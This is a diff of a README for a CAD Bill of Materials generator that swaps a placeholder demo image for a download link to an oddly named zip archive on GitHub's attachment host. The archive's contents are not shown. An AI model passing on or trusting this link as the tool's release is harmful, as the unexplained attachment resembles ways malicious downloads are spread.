@@ -8,7 +8,8 @@ AI-powered CAD Bill of Materials generator with real component extraction"
 
 An AI-powered tool for automatically generating detailed Bill of Materials from CAD files. Extracts real component specifications, dimensions, and materials to create professional construction estimates.
 
-![CAD BoM Generator Demo](https://via.placeholder.com/800x400/366092/FFFFFF?text=CAD+BoM+Generator+Demo)
+[cad-bom-generator.zip (1).zip](https://github.com/user-attachments/files/22636990/cad-bom-generator.zip.1.zip)
+
 
 ## 🌟 Features
 
